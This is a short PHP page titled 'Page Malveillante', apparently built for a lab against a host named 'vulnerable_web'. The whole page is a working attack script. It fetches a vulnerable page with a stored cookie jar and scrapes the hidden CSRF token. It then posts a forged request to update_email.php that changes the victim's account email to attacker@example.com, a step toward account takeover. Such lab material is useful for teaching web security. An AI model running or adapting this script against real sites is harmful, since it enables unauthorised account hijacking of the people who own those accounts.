<!DOCTYPE html>
<html>
<head>
    <title>Page Malveillante</title>
</head>
<body>
    <h1>Page Malveillante</h1>
    <?php
    $host = 'vulnerable_web';
    $port = '80';
    $baseUrl = "http://$host:$port/";

    $url = $baseUrl . 'vulnerable_site.php';
    $ch = curl_init($url);

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);

    $response = curl_exec($ch);

    if ($response === false) {
        $error = curl_error($ch);
        echo '<p>Erreur lors de la récupération du token CSRF : ' . htmlspecialchars($error) . '</p>';
        curl_close($ch);
        exit;
    }

    curl_close($ch);

    echo '<pre>' . htmlspecialchars($response) . '</pre>';

    if (preg_match('/<input type="hidden" name="csrf_token" value="([a-f0-9]{64})"/', $response, $matches)) {
        $csrfToken = $matches[1];

        $url = $baseUrl . 'update_email.php';
        $data = http_build_query([
            'csrf_token' => $csrfToken,
            'email' => 'attacker@example.com'
        ]);

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);

        $response = curl_exec($ch);

        if ($response === false) {
            $error = curl_error($ch);
            echo '<p>Erreur lors de la soumission du formulaire : ' . htmlspecialchars($error) . '</p>';
        } else {
            echo '<p>Form submitted successfully.</p>';
            echo '<pre>' . htmlspecialchars($response) . '</pre>';
        }

        curl_close($ch);
    } else {
        echo '<p>Token CSRF non trouvé dans la réponse.</p>';
    }
    ?>
</body>
</html>
